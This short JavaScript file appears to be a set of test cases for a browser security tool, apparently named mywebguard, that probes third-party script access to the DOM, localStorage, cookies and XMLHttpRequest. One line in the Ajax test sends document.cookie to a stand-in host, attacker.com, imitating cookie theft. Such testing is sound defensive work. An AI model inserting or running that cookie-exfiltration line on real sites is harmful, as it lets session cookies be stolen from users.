//test case 1: document.getElementById
document.getElementById("malicious");

//test case 2: localStorage.getItem

alert("Debug from https://mywebguard-thirdparty.github.io: localStorage.getItem('mywebguard')="+
      localStorage.getItem('mywebguard'));

//test case 3: document.cookie
if (document.cookie && document.cookie.indexOf("mywebguard")>=0) {
  alert("Debug from https://mywebguard-thirdparty.github.io: document.cookie="+
      document.cookie);
}else
  document.cookie="mywebguard=mywebguard-cookie-test";


//test case 4: Ajax
function ajaxTest(url) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     //document.getElementById("demo").innerHTML = this.responseText;
	    alert("Debug from https://mywebguard-thirdparty.github.io: ajaxTest('"+url+"')"+this.responseText);
    }
  };
  xhttp.open("GET", url, true);
  xhttp.send();
}
ajaxTest("index.html");
ajaxTest("https://attacker.com/?cookie="+document.cookie);
ajaxTest("https://mywebguard-thirdparty.github.io");


